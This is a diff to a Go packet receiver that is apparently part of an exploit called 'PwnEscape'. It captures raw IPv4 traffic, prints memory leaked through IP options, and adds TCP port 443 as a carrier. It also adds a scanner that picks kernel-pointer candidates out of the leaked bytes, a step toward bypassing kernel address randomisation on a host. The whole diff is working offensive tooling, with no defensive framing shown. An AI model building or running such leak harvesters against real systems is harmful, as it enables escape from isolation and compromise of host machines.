@@ -24,6 +24,7 @@ const (
 	vlan8021Q  = 0x8100
 	vlan8021AD = 0x88a8
 	ipLen      = 20
+	ipProtoTCP = 6
 	ipProtoUDP = 17
 	ipProtoRaw = 253
 )
@@ -31,6 +32,7 @@ const (
 type config struct {
 	iface    string
 	udpPort  int
+	tcpPort  int
 	idBase   int
 	idCount  int
 	duration time.Duration
@@ -40,6 +42,7 @@ func main() {
 	c := config{}
 	flag.StringVar(&c.iface, "iface", "eth0", "interface to capture")
 	flag.IntVar(&c.udpPort, "udp-port", 9, "PwnEscape UDP destination port")
+	flag.IntVar(&c.tcpPort, "tcp-port", 443, "PwnEscape TCP destination port")
 	flag.IntVar(&c.idBase, "id-base", 0x9999, "first expected IPv4 ID")
 	flag.IntVar(&c.idCount, "id-count", 65536, "number of expected IPv4 IDs")
 	duration := flag.Duration("duration", 0, "stop after this duration (zero waits for a signal)")
@@ -50,8 +53,8 @@ func main() {
 		fmt.Fprintln(os.Stderr, "receiver must run as root or with CAP_NET_RAW")
 		os.Exit(1)
 	}
-	if c.udpPort < 1 || c.udpPort > 65535 || c.idBase < 0 || c.idBase > 65535 || c.idCount < 1 || c.idCount > 65536 {
-		fmt.Fprintln(os.Stderr, "invalid UDP port or IPv4 ID range")
+	if c.udpPort < 1 || c.udpPort > 65535 || c.tcpPort < 1 || c.tcpPort > 65535 || c.idBase < 0 || c.idBase > 65535 || c.idCount < 1 || c.idCount > 65536 {
+		fmt.Fprintln(os.Stderr, "invalid UDP/TCP port or IPv4 ID range")
 		os.Exit(1)
 	}
 	if err := capture(c); err != nil {
@@ -84,8 +87,8 @@ func capture(c config) error {
 		deadline = time.Now().Add(c.duration)
 	}
 
-	fmt.Printf("receiver: iface=%s index=%d udp_port=%d id_base=0x%04x id_count=%d\n",
-		ifi.Name, ifi.Index, c.udpPort, c.idBase, c.idCount)
+	fmt.Printf("receiver: iface=%s index=%d udp_port=%d tcp_port=%d id_base=0x%04x id_count=%d\n",
+		ifi.Name, ifi.Index, c.udpPort, c.tcpPort, c.idBase, c.idCount)
 	buf := make([]byte, 65536)
 	seen := make(map[uint32]struct{})
 	packets := 0
@@ -124,13 +127,8 @@ func capture(c config) error {
 		frag := binary.BigEndian.Uint16(ip[6:8])
 		offset := frag & 0x1fff
 		more := frag&0x2000 != 0
-		if ip[9] != ipProtoRaw && ip[9] != ipProtoUDP {
+		if !carrierExpected(ip, ihl, offset, c) {
 			continue
-		}
-		if ip[9] == ipProtoUDP && offset == 0 {
-			if len(ip) < ihl+8 || int(binary.BigEndian.Uint16(ip[ihl+2:ihl+4])) != c.udpPort {
-				continue
-			}
 		}
 
 		key := uint32(id)<<16 | uint32(frag)
@@ -150,8 +148,40 @@ func capture(c config) error {
 			if len(options) > 8 {
 				leak := options[8:]
 				fmt.Printf("  past-linear hex=%s ascii=%q\n", hex.EncodeToString(leak), string(leak))
+				for _, candidate := range kernelPointerCandidates(leak) {
+					fmt.Printf("  host-pointer-candidate offset=%d little=0x%016x\n", candidate.offset, candidate.value)
+				}
 			}
 		}
+	}
+}
+
+type kernelPointerCandidate struct {
+	offset int
+	value  uint64
+}
+
+func kernelPointerCandidates(data []byte) []kernelPointerCandidate {
+	var out []kernelPointerCandidate
+	for offset := 0; offset+8 <= len(data); offset++ {
+		value := binary.LittleEndian.Uint64(data[offset : offset+8])
+		if value>>48 == 0xffff && value&0x7 == 0 {
+			out = append(out, kernelPointerCandidate{offset: offset, value: value})
+		}
+	}
+	return out
+}
+
+func carrierExpected(ip []byte, ihl int, offset uint16, c config) bool {
+	switch ip[9] {
+	case ipProtoRaw:
+		return true
+	case ipProtoUDP:
+		return offset != 0 || (len(ip) >= ihl+8 && int(binary.BigEndian.Uint16(ip[ihl+2:ihl+4])) == c.udpPort)
+	case ipProtoTCP:
+		return offset != 0 || (len(ip) >= ihl+20 && int(binary.BigEndian.Uint16(ip[ihl+2:ihl+4])) == c.tcpPort)
+	default:
+		return false
 	}
 }
 
